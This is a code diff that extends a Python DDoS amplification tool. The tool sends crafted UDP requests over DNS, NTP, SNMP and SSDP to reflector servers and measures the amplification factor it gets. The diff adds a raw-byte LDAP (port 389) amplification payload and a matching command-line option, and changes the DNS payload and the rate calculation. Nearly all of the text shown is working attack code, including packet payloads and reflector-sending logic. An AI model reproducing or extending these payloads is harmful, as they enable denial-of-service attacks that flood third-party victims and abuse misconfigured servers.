@@ -28,6 +28,7 @@ HELP = (
 	'NTP Amplification file',
 	'SNMP Amplification file',
 	'SSDP Amplification file',
+	'LDAP Amplification file',
 	'Number of threads (default=1)' )
 
 OPTIONS = (
@@ -35,7 +36,8 @@ OPTIONS = (
 	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
 	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
 	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
-	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )
+	(('-l', '--ldap'), dict(dest='ldap', metavar='FILE', help=HELP[4])),
+	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[5])) )
 
 BENCHMARK = (
 	'Protocol'
@@ -55,26 +57,34 @@ PORT = {
 	'dns': 53,
 	'ntp': 123,
 	'snmp': 161,
-	'ssdp': 1900 }
+	'ssdp': 1900,
+	'ldap': 389
+	}
 
 PAYLOAD = {
-	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
-			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
-			'\x00\x00\x00\x00\x00\x00'),
+	'dns': ('\xca\xf7\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01'),
 	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
 		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
 		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
 		'\x01\x02\x01\x05\x00'),
 	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
 	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
-}
+	'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'),
+        'ldap':('\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a'
+                '\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01'
+                '\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65'
+                '\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00'
+               '\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e'
+                '\x65\x74\x6c\x6f\x67\x6f\x6e')
+	}
 
 amplification = {
 	'dns': {},
 	'ntp': {},
 	'snmp': {},
-	'ssdp': {} }		# Amplification factor
+	'ssdp': {},
+	'ldap': {}
+		 }		# Amplification factor
 
 FILE_NAME = 0			# Index of files names
 FILE_HANDLE = 1 		# Index of files descriptors
@@ -124,7 +134,7 @@ def Monitor():
 	start = time.time()
 	while True:
 		try:
-			current = time.time() - start
+			current = time.time() - start or 1
 			bps = (nbytes*8)/current
 			pps = npackets/current
 			out = FMT.format(Calc(npackets, 1000), 
@@ -193,7 +203,7 @@ class DDoS(object):
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		sock.settimeout(2)
 		data = ''
-		if proto in ['ntp', 'ssdp']:
+		if proto in ['ntp', 'ssdp', 'ldap']:
 			packet = PAYLOAD[proto]
 			sock.sendto(packet, (soldier, PORT[proto]))
 			try:
@@ -301,6 +311,8 @@ def main():
 		files['snmp'] = [options.snmp]
 	if options.ssdp:
 		files['ssdp'] = [options.ssdp]
+	if options.ldap:
+		files['ldap'] = [options.ldap]
 	if files:
 		event = threading.Event()
 		event.set()
